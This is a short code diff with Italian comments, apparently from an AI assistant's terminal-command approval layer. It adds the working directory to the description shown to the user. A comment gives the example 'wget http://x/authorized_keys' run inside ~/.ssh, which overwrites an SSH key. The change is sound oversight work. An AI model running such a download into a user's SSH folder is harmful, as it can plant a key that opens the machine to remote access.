@@ -325,7 +325,15 @@
       },
       describe: (a) => {
         const cmd = String((a && (a.comando ?? a.command ?? a.cmd)) || '').trim();
-        return `Eseguire nel terminale:\n${cmd || '(comando vuoto)'}`;
+        // DOVE il comando agisce non si legge nel comando: la cartella di lavoro
+        // è persistente e la sposta l'assistente da sé (`cd` è livello 1, non
+        // chiede niente). Senza dirlo, `wget http://x/authorized_keys` ha lo
+        // stesso identico testo nella home — dove è innocuo — e dentro ~/.ssh,
+        // dove sovrascrive una chiave. La cartella la inietta il main come
+        // `_cwd` (mai l'LLM); il livello non ci si appoggia mai.
+        const cwd = String((a && a._cwd) || '').trim();
+        return `Eseguire nel terminale:\n${cmd || '(comando vuoto)'}`
+          + (cwd ? `\nCartella di lavoro: ${cwd}` : '');
       },
     },
     // ── proxy per-tab via linguaggio naturale (#152) ──────────────────────────
